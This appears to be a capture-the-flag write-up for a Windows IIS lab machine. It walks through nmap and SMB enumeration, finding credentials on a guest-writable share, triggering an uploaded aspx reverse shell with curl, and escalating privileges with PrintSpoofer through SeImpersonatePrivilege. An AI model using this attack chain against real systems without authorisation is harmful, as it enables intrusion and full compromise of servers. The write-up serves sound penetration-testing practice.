# Relevant

### Pre-engagement briefing

**Scope of Work**

The client requests that an engineer conducts an assessment of the provided virtual 
environment. The client has asked that minimal information be provided about the assessment, 
wanting the engagement conducted from the eyes of a malicious actor (black box penetration 
test).  The client has asked that you secure two flags (no location provided) as proof of 
exploitation:

- User.txt
- Root.txt

Additionally, the client has provided the following scope allowances:

- Any tools or techniques are permitted in this engagement, however we ask that you attempt 
manual exploitation first
- Locate and note all vulnerabilities found
- Submit the flags discovered to the dashboard
- Only the IP address assigned to your machine is in scope
- Find and report ALL vulnerabilities (yes, there is more than one path to root)

### Reconnaissance

IP of target resolves to an IIS Windows Server

[nmap scan](./relevant.nmap) `nmap -sC -v <TARGET-IP> -oN relevant.nmap`

[nmap full port scan](./relevant-full-port.nmap)

[nmap smb scan](./relevant-smb-enum.nmap)

Two IIS servers on 80 and 49663, SMB on 445 and RDP on 3389

*Note: shares can be listed with `smbclient -L <TARGET-IP>`*

SMB share nt4wrksv is discoverable and accessible by guest. The guest account also has read, 
write privileges. The share contains a file called passwords.txt with encoded credentials 
for users Bill and Bob. The user Bill is fake, Bob is a valid user but the password is wrong.

*Note: Check credential validity with Impacket's psexec.py:
`impacket-psexec <USER>:'<PASSWORD>@<TARGET-IP>'`*

[gobuster](./relevant.gobuster)

Directory enumeration of the target show a directory of the same name as the smb share 
nt4wrksv on the server running on port 49663. The content of the share is accessible through 
this directory.

### Exploitation

Access to the target can be gained by uploading an aspx reverse shell to the smb share 
nt4wrksv and activating it with a curl request 

`curl http://<TARGET-IP>:49663/nt4wrksv/shell.aspx`

`whoami /priv` reveals the following privileges

```
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

Upload and gain root using [PrintSpoofer](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)

More privesc options, nice to revisit
